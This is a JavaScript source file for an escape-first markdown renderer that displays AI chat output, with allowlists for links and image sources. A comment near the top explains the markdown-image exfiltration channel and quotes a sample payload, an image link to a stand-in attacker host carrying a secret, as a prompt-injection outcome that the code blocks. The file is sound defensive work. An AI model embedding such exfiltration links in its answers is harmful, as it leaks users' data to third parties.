// superbot /chat markdown — escape-first renderer, no dependencies.
//
// Grammar: ATX and setext headings, bold/italic, `==key fact==` highlights,
// inline code, nested lists,
// blockquotes, hr, simple pipe tables, [text](url) links (scheme-allowlisted),
// <https://…> angle autolinks, ``` / ~~~ fences with a language label + copy
// bar, four-space indented code, inline and display math, hard breaks, decoded
// entities and backslash escapes, and the <sub>/<sup>/<kbd> allowlist.
//
// THE ORDERING (the property this file rests on): text is ENTITY-DECODED and
// then HTML-ESCAPED before a byte of markup is recognised, in that order.
// scan() replaces a RECOGNISED entity reference (`&amp;` `&lt;` `&mdash;`
// `&#8212;`, the closed list below) with the character it names and leaves
// every other run exactly as written; esc() then output-encodes the result.
// So `&amp;` renders as `&`, a raw `&` stays safe, and `&lt;script&gt;` — like
// a raw `<script>` — comes out as the visible text `&lt;script&gt;` and never
// as an element. Nothing is ever decoded into a raw HTML sink: the only tags
// this file emits are the ones it builds itself, never model text verbatim.
//
// A backslash escape (`\*`) and the three inline tags are held in the same
// masked pass: an escape becomes its own literal character, `<sub>…</sub>`
// becomes that tag with escaped plain text inside, and EVERY other tag stays
// escaped literal text.
//
// Renders arbitrary prefixes safely: an unterminated ``` fence shows its label
// bar with a cursor instead of leaking the half-fence as prose. That is what
// lets the typewriter reveal in chat.js call this on every animation frame —
// the fence only "opens" once its closer has arrived.
const esc = (s) => s.replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
const SAFE_HREF = /^(https?:\/\/|mailto:)/i;
// The allowlist in force for the current render. The chat, which renders
// MODEL output, never widens it; a first-party document (the install
// recipes, served by the edge) passes its own through renderMd's option so
// an app deep link (cursor://, vscode:, claude-cli://) survives.
let hrefRe = SAFE_HREF;
let sameOrigin = '';
// img src allowlist: same-origin generated files (/gen/, what the image-gen
// adapters return) plus base64 raster/svg data URIs. SVG in an <img> cannot run
// script. Arbitrary web URLs are deliberately NOT allowed: a model answer
// carrying `![x](https://attacker/?d=secret)` used to make every viewer's
// browser fetch it on render — the markdown-image exfiltration channel
// (OWASP LLM01:2025 prompt injection; embracethered.com, Google AI Studio
// 2024). A refused src falls through to the link rule and renders as a
// CLICKABLE link — no auto-fetch, but a click is a navigation — so anchors
// carry referrerpolicy="no-referrer" and the payload stays one explicit
// reader action, never an ambient one.
const SAFE_SRC = /^(\/gen\/|data:image\/(?:png|jpe?g|webp|gif|svg\+xml);base64,)/i;

// --- entities -------------------------------------------------------------
// The named entities decoded at parse time. The list is closed on purpose
// (the same closed set desktop packages/core/src/md.ts carries): an entity
// outside it stays the literal text the writer wrote, so `&foo;` never turns
// into a stray semicolon-bearing run.
const NAMED_ENTITIES = {
  amp: '&',
  lt: '<',
  gt: '>',
  quot: '"',
  apos: "'",
  nbsp: '\u00A0',
  mdash: '—',
  ndash: '–',
  hellip: '…',
  copy: '©',
  reg: '®',
  trade: '™',
  laquo: '«',
  raquo: '»',
  times: '×',
};
const ENTITY_RE = /^&(?:#[xX][0-9a-fA-F]+|#[0-9]+|[a-zA-Z][a-zA-Z0-9]*);/;
// Every ASCII punctuation code point, which is exactly what a backslash may
// escape (`\*` -> `*`); a backslash before a letter stays a literal backslash.
const ASCII_PUNCT = /[!-/:-@[-`{-~]/;

// One `&…;` entity decoded to its character, or null when it is not one this
// renderer knows: the named set above, `&#N;` decimal and `&#xH;` hex. NUL is
// refused because it is the marker byte scan() uses internally.
function decodeEntity(raw) {
  const body = raw.slice(1, -1);
  if (body.startsWith('#')) {
    const hex = body[1] === 'x' || body[1] === 'X';
    const digits = body.slice(hex ? 2 : 1);
    if (!/^[0-9]+$/.test(digits) && !(hex && /^[0-9a-fA-F]+$/.test(digits))) return null;
    const code = Number.parseInt(digits, hex ? 16 : 10);
    if (!Number.isFinite(code) || code < 1 || code > 0x10ffff) return null;
    try {
      return String.fromCodePoint(code);
    } catch {
      return null;
    }
  }
  return NAMED_ENTITIES[body] ?? null;
}

// --- the masked pass ------------------------------------------------------
// MARK wraps the index of one protected span, so the inline marker rules that
// run afterwards can never re-read the characters it stands for. NUL cannot
// occur in model text, so it can never collide with real content.
const MARK = '\u0000';
const MARK_RE = /\u0000(\d+)\u0000/g;

// Walk the source once, producing a string where four things are replaced by
// markers instead of their own characters:
//   * an inline code span (`a` and the multi-tick `` a ` b `` form) — its body
//     is code, so it is neither entity-decoded nor re-read as markup;
//   * a backslash escape, and `\(tex\)` inline math (claimed before the escape
//     rule can eat the backslash as a literal parenthesis);
//   * `<sub>`, `<sup>`, `<kbd>` with plain-text content, `<br>` / `<br/>` and
//     an angle autolink `<https://…>`;
//   * `$tex$` inline math, under the price-safe rule that a `$` whose closer
//     is not preceded by a non-space or is followed by a digit never matches,
//     so `$5 and $10` stays prose.
// Everything else is copied verbatim — including a decoded entity's character,
// which is deliberately NOT re-scanned, so `&lt;b&gt;` decodes to `<b>` and
// then escapes to visible `&lt;b&gt;` text instead of becoming an element.
function scan(src, parts) {
  let out = '';
  let i = 0;
  const mask = (part) => {
    out += `${MARK}${parts.length}${MARK}`;
    parts.push(part);
  };
  while (i < src.length) {
    const c = src[i];
    if (c === '`') {
      let n = 0;
      while (src[i + n] === '`') n++;
      // The closer is a run of EXACTLY n backticks before the next line break;
      // an unmatched opener is literal text (a code span never crosses a line).
      let j = i + n;
      let close = -1;
      while (j < src.length) {
        if (src[j] === '\n') break;
        if (src[j] === '`') {
          let k = 0;
          while (src[j + k] === '`') k++;
          if (k === n) { close = j; break; }
          j += k;
          continue;
        }
        j++;
      }
      if (close === -1) {
        out += src.slice(i, i + n);
        i += n;
        continue;
      }
      mask({ k: 'code', text: src.slice(i + n, close) });
      i = close + n;
      continue;
    }
    if (c === '\\') {
      const next = src[i + 1] ?? '';
      if (next === '(') {
        const close = src.indexOf('\\)', i + 2);
        const nl = src.indexOf('\n', i);
        if (close !== -1 && (nl === -1 || close < nl)) {
          mask({ k: 'math', tex: src.slice(i + 2, close) });
          i = close + 2;
          continue;
        }
      } else if (ASCII_PUNCT.test(next)) {
        mask({ k: 'text', text: next });
        i += 2;
        continue;
      }
    }
    if (c === '&') {
      const ent = ENTITY_RE.exec(src.slice(i));
      const decoded = ent === null ? null : decodeEntity(ent[0]);
      if (ent !== null && decoded !== null) {
        out += decoded;
        i += ent[0].length;
        continue;
      }
    }
    if (c === '<') {
      const tag = /^<(sub|sup|kbd)>([^<>\n]*)<\/\1>/.exec(src.slice(i));
      if (tag) {
        mask({ k: 'tag', tag: tag[1], text: tag[2] });
        i += tag[0].length;
        continue;
      }
      const br = /^<br\s*\/?>/.exec(src.slice(i));
      if (br) {
        mask({ k: 'br' });
        i += br[0].length;
        continue;
      }
      const auto = /^<(https?:\/\/[^\s<>]+)>/.exec(src.slice(i));
      if (auto) {
        mask({ k: 'link', url: auto[1] });
        i += auto[0].length;
        continue;
      }
    }
    if (c === '$' && src[i + 1] !== '$') {
      const math = /^\$(?=\S)([^$\n]*?)(?<=\S)\$(?!\d)/.exec(src.slice(i));
      if (math) {
        mask({ k: 'math', tex: math[1] });
        i += math[0].length;
        continue;
      }
    }
    out += c;
    i++;
  }
  return out;
}

// One masked span back as HTML. A code span's body and every literal are
// escaped here; a math span carries its TeX escaped inside the site's math
// classes, for a CDN-hosted KaTeX auto-render to typeset; the tag spans are
// the ONLY tags markdown can mint, with escaped plain text inside.
const emitPart = (p) => {
  if (p.k === 'code') return `<code>${esc(p.text)}</code>`;
  if (p.k === 'text') return esc(p.text);
  if (p.k === 'math') return `<span class="md-math">\\(${esc(p.tex)}\\)</span>`;
  if (p.k === 'br') return '<br/>';
  if (p.k === 'link')
    return `<a href="${esc(p.url)}" target="_blank" rel="noopener noreferrer" referrerpolicy="no-referrer">${esc(p.url)}</a>`;
  return `<${p.tag}>${esc(p.text)}</${p.tag}>`;
};

// A key fact, `==x==` (the `mark` client cap): drawn as <mark class="kf">, the
// accent ink and semibold the stylesheet gives it (no background). The pair
// rule is the apps' own (desktop and mobile md.ts inline kind `mark`): no word
// character or `=` before the opener, a non-space non-`=` after it, the mirror
// at the closer, and no `==` between them, on one line, so `a == b`, `x==y`,
// `a === b` and a `====` ruler never pair. A code span is already a marker here
// (scan), so a `==` inside it never reaches this. Text has been escaped by now,
// so every `<` is a tag the rules above minted: the first alternative walks
// over each whole tag, and a body takes a tag whole too, so a `==` inside an
// href or a src is never read and a pair never ends inside an attribute.
// Linear: a closer is the first `==` after its opener, so each opener's scan
// stops there.
const KEY_FACT_RE = /(<[^>]*>)|(?<![\w=])==(?=[^\s=])((?:<[^>]*>|(?!==)[^\n<])+?)(?<=[^\s=])==(?![\w=])/g;

const inline = (s, parts) =>
  s
    // images before links: ![alt](src) contains the link shape, so the link
    // rule would otherwise eat it and leave a stray "!anchor". A target that
    // still carries a marker (an escape or math inside it) is refused: the
    // marker's HTML must never land inside an attribute.
    .replace(/!\[([^\]]*)\]\(([^)\s]+)\)/g, (m, alt, src) =>
      !alt.includes(MARK) && !src.includes(MARK) && SAFE_SRC.test(src)
        ? `<img src="${src}" alt="${alt}" loading="lazy" referrerpolicy="no-referrer"/>`
        : m,
    )
    .replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (m, t, href) => {
      if (!hrefRe.test(href) || href.includes(MARK)) return m;
      // a web link opens beside the page; an app link hands off to the app
      // and gets no blank tab; a link back into this origin (a recipe's
      // absolute {{ORIGIN}} example) stays in this tab like any site link
      const web = SAFE_HREF.test(href) && !(sameOrigin && (href.startsWith(sameOrigin) || `${href}/` === sameOrigin));
      return `<a href="${href}"${web ? ' target="_blank" rel="noopener noreferrer"' : ''} referrerpolicy="no-referrer">${t}</a>`;
    })
    .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
    .replace(/\*([^*\n]+)\*/g, '<i>$1</i>')
    .replace(KEY_FACT_RE, (m, tag, words) => (tag === undefined ? `<mark class="kf">${words}</mark>` : m))
    .replace(MARK_RE, (_, n) => emitPart(parts[+n]));

// --- syntax highlighting: heuristic micro-lexer (microlight's premise —
// one lexer for any language — plus a small lang-aware comment marker).
// It lexes the RAW code left to right and escapes PER TOKEN, so an HTML
// entity can never be split mid-span; classes are a fixed allowlist
// (tk-c comment / tk-s string / tk-n number / tk-k keyword). Runs every
// animation frame on a growing prefix, so an unterminated string or block
// comment simply colors to the end of what has arrived.
const KW = new Set(
  ('abstract and as async await begin bool break case catch chan class const continue def defer do elif else end enum ' +
   'except export extends false final finally fn for from func function go if impl implements import in int interface ' +
   'is lambda let local loop match mod module new nil none not null of or override package priv private pub public ' +
   'raise range return select self static struct switch then this throw true try type undefined use var void while with yield').split(' '),
);
const lineComment = (lang) =>
  /^(py|python|sh|bash|zsh|shell|yaml|yml|toml|rb|ruby|fish|dockerfile|makefile|r|conf|ini)$/i.test(lang) ? '#'
  : /^(sql|lua|hs|haskell|elm)$/i.test(lang) ? '--'
  : '//';
function hlight(lang, code) {
  const lc = lineComment(lang);
  const n = code.length;
  let out = '';
  let i = 0;
  const push = (cls, text) => { out += cls ? `<span class="tk-${cls}">${esc(text)}</span>` : esc(text); };
  const interesting = (j) =>
    /[A-Za-z_$0-9"'`]/.test(code[j]) || code.startsWith(lc, j) || (lc === '//' && code.startsWith('/*', j));
  while (i < n) {
    const c = code[i];
    if (code.startsWith(lc, i)) {
      let j = code.indexOf('\n', i);
      if (j === -1) j = n;
      push('c', code.slice(i, j));
      i = j;
      continue;
    }
    if (lc === '//' && code.startsWith('/*', i)) {
      let j = code.indexOf('*/', i + 2);
      j = j === -1 ? n : j + 2;
      push('c', code.slice(i, j));
      i = j;
      continue;
    }
    if (c === '"' || c === "'" || c === '`') {
      let j = i + 1;
      while (j < n) {
        if (code[j] === '\\') { j += 2; continue; }
        if (code[j] === c || (c !== '`' && code[j] === '\n')) break;
        j++;
      }
      if (j < n && code[j] === c) j++;
      push('s', code.slice(i, j));
      i = j;
      continue;
    }
    if (/[0-9]/.test(c)) {
      let j = i + 1;
      while (j < n && /[\w.]/.test(code[j])) j++;
      push('n', code.slice(i, j));
      i = j;
      continue;
    }
    if (/[A-Za-z_$]/.test(c)) {
      let j = i + 1;
      while (j < n && /[\w$]/.test(code[j])) j++;
      const w = code.slice(i, j);
      push(KW.has(w) ? 'k' : '', w);
      i = j;
      continue;
    }
    let j = i + 1;
    while (j < n && !interesting(j)) j++;
    push('', code.slice(i, j));
    i = j;
  }
  return out;
}

const codeShell = (lang, code, open) =>
  `<div class="code"><div class="lbl"><span>${esc(lang)}</span>` +
  (open
    ? '<span class="crsr">▊</span>'
    : '<button class="cpy" data-act="copy-code">copy</button>') +
  `</div><pre><code>${hlight(lang, code)}</code></pre></div>`;

const cells = (l) => l.replace(/^\s*\|/, '').replace(/\|\s*$/, '').split('|').map((c) => c.trim());
const isSep = (l) => /^\s*\|?[\s:-]*-[\s:|-]*\|[\s:|-]*$/.test(l) && l.includes('|');

// A list marker line: its indent, its bullet or numeral, its text.
const LIST_LINE = /^([ \t]*)([-*+]|\d+[.)])\s+(.*)$/;
// How deep a ragged indent ladder may nest. Past the cap every deeper marker
// is clamped to the deepest level instead of building a gutter nothing can draw.
const LIST_MAX_DEPTH = 5;

// One flat scan's items as nested list HTML: depth 0 is the outer list, and a
// deeper item opens its list INSIDE the still-open <li> above it. A marker-type
// switch at one level closes that list and opens the other, so `- a` then
// `1. b` under one bullet stays two lists rather than one mis-numbered one.
function listHtml(items, render) {
  let html = '';
  let cur = -1;
  const orderedAt = [];
  let liOpen = false;
  // The `start` an ordered list opens at: the numeral its own first item was
  // written with, when that is not 1 (`3.` -> `<ol start="3">`). An unordered
  // item, a bullet, or a list already counted from 1 needs nothing here, so
  // every pre-existing case mints the exact same bytes.
  const startAttr = (it) =>
    it.ordered && it.number !== null && it.number !== 1 ? ` start="${it.number}"` : '';
  for (const it of items) {
    const d = it.depth;
    while (cur > d) {
      if (liOpen) { html += '</li>'; liOpen = false; }
      html += orderedAt.pop() ? '</ol>' : '</ul>';
      cur--;
      liOpen = true; // back inside the parent item
    }
    if (cur === d) {
      if (liOpen) { html += '</li>'; liOpen = false; }
      if (orderedAt[cur] !== it.ordered) {
        html += orderedAt[cur] ? '</ol>' : '</ul>';
        orderedAt[cur] = it.ordered;
        html += it.ordered ? `<ol${startAttr(it)}>` : '<ul>';
      }
    } else {
      cur = d;
      orderedAt[cur] = it.ordered;
      html += it.ordered ? `<ol${startAttr(it)}>` : '<ul>';
    }
    html += `<li>${render(it.text)}`;
    liOpen = true;
  }
  while (cur >= 0) {
    if (liOpen) { html += '</li>'; liOpen = false; }
    html += orderedAt[cur] ? '</ol>' : '</ul>';
    cur--;
    liOpen = true;
  }
  return html;
}

// One text block (no fences). The line pass below reads the RAW lines, so
// block syntax outranks inline decoding (`&gt;` is text, never a quote, and a
// decoded `&#10;` cannot split a block); render() is the ONE place a line's
// text becomes HTML — entity-decode, then escape, then the inline rules.
function blocks(text) {
  const parts = [];
  const render = (c) => inline(esc(scan(c, parts)), parts);
  const lines = text.split('\n');
  const out = [];
  let p = [];
  const flushP = () => {
    if (p.length) {
      out.push(`<p>${p.map(render).join('<br/>')}</p>`);
      p = [];
    }
  };
  for (let i = 0; i < lines.length; i++) {
    const l = lines[i];
    if (!l.trim()) {
      flushP();
      continue;
    }
    let m;
    // Setext, only while a paragraph is OPEN (a `---` with nothing over it is
    // still a rule), and before the rule test, so `Title\n---` is a heading.
    if (p.length && /^(=+|-+)[ \t]*$/.test(l)) {
      const level = l.trim().startsWith('=') ? 1 : 2;
      out.push(`<h${level} class="h h${level}">${render(p.join(' '))}</h${level}>`);
      p = [];
      continue;
    }
    if ((m = /^(#{1,3})\s+(.*)$/.exec(l))) {
      flushP();
      // real h1/h2/h3, not divs: a recipe page needs exactly one h1 in its
      // document outline (chat transcripts keep the .h/.hN classes so their
      // style ramp is unchanged)
      const lvl = m[1].length;
      out.push(`<h${lvl} class="h h${lvl}">${render(m[2])}</h${lvl}>`);
      continue;
    }
    if (/^\s*(-{3,}|\*{3,})\s*$/.test(l)) {
      flushP();
      out.push('<hr/>');
      continue;
    }
    // A quote marker is a RAW ">" (this pass reads raw lines): a line written
    // as `&gt;` is ordinary text, as CommonMark and desktop md.ts read it, and
    // still DISPLAYS as ">" once the line's text is decoded.
    if (/^\s*>/.test(l)) {
      flushP();
      const q = [];
      while (i < lines.length && /^\s*>/.test(lines[i])) {
        q.push(lines[i].replace(/^\s*>\s?/, ''));
        i++;
      }
      i--;
      // A GitHub alert: the marker line becomes the title (the writer's own,
      // else the variant's name) and the rest renders as blocks under it.
      const alert = ALERT_LINE.exec(q[0]);
      if (alert) {
        const variant = alert[1].toLowerCase();
        const label = esc(alert[2].trim() || CALLOUT_LABEL[variant]);
        out.push(
          `<aside class="callout callout-${variant}" role="note" aria-label="${label}"><p class="callout-title">${label}</p>${blocks(q.slice(1).join('\n'))}</aside>`,
        );
        continue;
      }
      out.push(`<blockquote>${q.map(render).join('<br/>')}</blockquote>`);
      continue;
    }
    if ((m = LIST_LINE.exec(l))) {
      flushP();
      const items = [];
      const stack = [];
      let prev = -1;
      while (i < lines.length) {
        const li = LIST_LINE.exec(lines[i]);
        if (!li) break;
        const indent = li[1].replace(/\t/g, '  ').length;
        // The indent stack: an item two or more columns past the previous
        // marker's indent is one level deeper; anything else pops back to the
        // ancestor it does match. Replaces the old flat scan, which read every
        // indented marker as a sibling of the one above it.
        while (stack.length > 1 && indent < stack[stack.length - 1]) stack.pop();
        const top = stack[stack.length - 1];
        if (top === undefined || indent >= top + 2) stack.push(indent);
        else if (indent < top) {
          stack.length = 0;
          stack.push(indent);
        }
        // A depth jump past the next level is clamped: a ragged ladder must
        // not leave an empty <li> holding an empty list.
        const depth = Math.min(Math.min(stack.length - 1, LIST_MAX_DEPTH), prev + 1);
        const ordered = /^\d/.test(li[2]);
        // The writer's own numeral for an ordered marker (the `3` of `3.` or
        // `3)`), null for a bullet. Carried here so a list that does not start
        // at 1 keeps the writer's numbering: the opening <ol> of such a list
        // takes a `start` attribute, instead of the browser recounting from 1.
        items.push({
          depth: Math.max(depth, 0),
          ordered,
          number: ordered ? Number.parseInt(li[2], 10) : null,
          text: li[3],
        });
        prev = items[items.length - 1].depth;
        i++;
      }
      i--;
      out.push(listHtml(items, render));
      continue;
    }
    if (l.includes('|') && i + 1 < lines.length && isSep(lines[i + 1])) {
      flushP();
      const head = cells(l);
      i += 2;
      const rows = [];
      while (i < lines.length && lines[i].includes('|') && lines[i].trim()) {
        rows.push(cells(lines[i]));
        i++;
      }
      i--;
      // div.tbl is the sideways-scroll box (chat.html): the table keeps its
      // natural column widths inside it instead of crushing to the phone
      out.push(
        '<div class="tbl"><table>' +
          `<tr>${head.map((c) => `<th>${render(c)}</th>`).join('')}</tr>` +
          rows.map((r) => `<tr>${r.map((c) => `<td>${render(c)}</td>`).join('')}</tr>`).join('') +
          '</table></div>',
      );
      continue;
    }
    // Four-space (or one-tab) indented code, with no paragraph open — the same
    // gate CommonMark uses, because an indented line under running prose is
    // that paragraph's continuation, never a code block.
    if (!p.length && /^(?: {4}|\t)/.test(l)) {
      const body = [];
      while (i < lines.length) {
        const line = lines[i];
        const code = /^(?: {4}|\t)(.*)$/.exec(line);
        if (code) { body.push(code[1]); i++; continue; }
        if (!line.trim()) { body.push(''); i++; continue; }
        break;
      }
      while (body.length && body[body.length - 1] === '') { body.pop(); i--; }
      out.push(codeShell('code', body.join('\n'), false));
      continue;
    }
    // A trailing backslash is a hard break; every paragraph newline is one
    // already (the join below), so the marker itself is what must not show.
    p.push(l.replace(/\\\s*$/, ''));
  }
  flushP();
  return out.join('');
}

// opts.safeHref: a RegExp widening the link allowlist for a FIRST-PARTY
// document (never for model output). opts.origin: this site's origin, so an
// absolute link back into it opens in this tab. Reset after every call,
// error or not.
export function renderMd(src, opts = {}) {
  hrefRe = opts.safeHref instanceof RegExp ? opts.safeHref : SAFE_HREF;
  sameOrigin = typeof opts.origin === 'string' && opts.origin ? opts.origin.replace(/\/$/, '') + '/' : '';
  try {
    return renderInner(src);
  } finally {
    hrefRe = SAFE_HREF;
    sameOrigin = '';
  }
}

function renderInner(src) {
  // Line-based fence pairing, not a blind split on '```' (which mangled the
  // 4-backtick quoting convention and turned inline ```code``` prose into a
  // fence — same rules as the CLI renderer): an opener is a line-start
  // backtick run whose info string carries no backtick; its closer is a bare
  // run at least as long, so a fenced block quoting a fenced document stays
  // one block. A fence still open at the end of the (possibly mid-stream)
  // text renders with the cursor in the label bar.
  //
  // Display math (`$$tex$$` or `\[tex\]` on one line, or a `$$` / `\[` opener
  // line closed by its own closer) is segmented here, right after the fence
  // walk, so its TeX body is never scanned for markdown — the same precedence
  // desktop md.ts gives math. A math block still open at the end of a prefix
  // renders too, so a half-arrived formula shows its own text instead of its
  // delimiters leaking into the prose around it.
  const lines = String(src ?? '').split('\n');
  let html = '';
  let plain = [];
  let fence = null; // { token, lang, body }
  let math = null; // { kind: '$$' | '\\[', body }
  const flushPlain = () => {
    if (plain.length) { html += blocks(plain.join('\n')); plain = []; }
  };
  // The TeX is escaped and wrapped in the site's math classes; the delimiters
  // are what a CDN-loaded KaTeX auto-render typesets. A page with no KaTeX
  // (or a reader whose CDN fetch failed) still sees the formula, as readable
  // escaped text, never as markup.
  const mathBlock = (tex) => `<div class="md-math-block">\\[${esc(tex)}\\]</div>`;
  for (let li = 0; li < lines.length; li++) {
    const l = lines[li];
    if (math) {
      const closed = math.kind === '$$' ? /^\s*\$\$\s*$/.test(l) : /^\s*\\\]\s*$/.test(l);
      if (closed) { html += mathBlock(math.body.join('\n')); math = null; }
      else math.body.push(l);
      continue;
    }
    const m = /^\s*(`{3,})(.*)$/.exec(l);
    if (fence) {
      if (m && m[2].trim() === '' && m[1].length >= fence.token.length) {
        html += codeShell(fence.lang, fence.body.join('\n'), false);
        fence = null;
      } else fence.body.push(l);
      continue;
    }
    if (m && !m[2].includes('`')) {
      flushPlain();
      fence = { token: m[1], lang: m[2].trim() || 'code', body: [] };
      continue;
    }
    // A `<details>` disclosure, segmented here (after the fence walk, so a tag
    // inside a fence stays code) because its body is a whole markdown document
    // rendered again by this same function, fences and all.
    if (DETAILS_OPEN.test(l)) {
      flushPlain();
      const d = detailsSpan(lines, li);
      html += d.html;
      li = d.next - 1;
      continue;
    }
    const oneLine = /^\s*\$\$(.+)\$\$\s*$/.exec(l) || /^\s*\\\[(.+)\\\]\s*$/.exec(l);
    if (oneLine) {
      flushPlain();
      html += mathBlock(oneLine[1]);
      continue;
    }
    const open = /^\s*\$\$\s*$/.test(l) ? '$$' : /^\s*\\\[\s*$/.test(l) ? '\\[' : null;
    if (open) {
      flushPlain();
      math = { kind: open, body: [] };
      continue;
    }
    plain.push(l);
  }
  if (math) html += mathBlock(math.body.join('\n')); // still streaming
  if (fence) html += codeShell(fence.lang, fence.body.join('\n'), true); // still streaming
  flushPlain();
  return html;
}

// `<details>` / `<details open>` at a line start, with an optional leading
// `<summary>…</summary>`: the body runs to the BALANCING `</details>` (a
// nested opener counts one deeper, a tag inside a fence counts nothing), or
// to the end of the text when unclosed (a streaming prefix). Text after the
// closer on its line is written back so the caller's walk renders it next.
// The summary is inline markdown, escaped like every other run.
const DETAILS_OPEN = /^[ \t]{0,3}<details(\s[^>]*)?>/i;
const DETAILS_TAGS = /<details(?:\s[^>]*)?>|<\/details\s*>/gi;
const SUMMARY_LEAD = /^\s*<summary(?:\s[^>]*)?>([\s\S]*?)<\/summary\s*>/i;

function detailsSpan(lines, i) {
  const m = DETAILS_OPEN.exec(lines[i]);
  const open = /\bopen\b/i.test(m[1] || '');
  const body = [];
  let depth = 1;
  let fence = null;
  let line = lines[i].slice(m[0].length);
  let j = i;
  let next = lines.length;
  for (;;) {
    const f = /^\s*(`{3,})(.*)$/.exec(line);
    if (fence) {
      body.push(line);
      if (f && f[2].trim() === '' && f[1].length >= fence.length) fence = null;
    } else if (f && !f[2].includes('`')) {
      fence = f[1];
      body.push(line);
    } else {
      let cut = -1;
      let tail = '';
      for (const t of line.matchAll(DETAILS_TAGS)) {
        if (t[0][1] !== '/') { depth++; continue; }
        if (--depth === 0) { cut = t.index; tail = line.slice(cut + t[0].length); break; }
      }
      if (cut >= 0) {
        body.push(line.slice(0, cut));
        if (tail.trim()) { lines[j] = tail; next = j; } else next = j + 1;
        break;
      }
      body.push(line);
    }
    if (++j >= lines.length) break;
    line = lines[j];
  }
  const inner = body.join('\n');
  const sm = SUMMARY_LEAD.exec(inner);
  const parts = [];
  const summary = sm && sm[1].trim() ? inline(esc(scan(sm[1].trim(), parts)), parts) : 'Details';
  const rest = sm ? inner.slice(sm[0].length) : inner;
  return {
    html: `<details class="md-details"${open ? ' open' : ''}><summary class="md-details-summary">${summary}</summary><div class="md-details-body">${renderInner(rest)}</div></details>`,
    next,
  };
}

// A GitHub alert's marker (the FIRST quoted line), and the title each variant
// shows when the writer gave none after the tag.
const ALERT_LINE = /^\s*\[!(note|tip|important|warning|caution)\][ \t]*(.*)$/i;
const CALLOUT_LABEL = { note: 'Note', tip: 'Tip', important: 'Important', warning: 'Warning', caution: 'Caution' };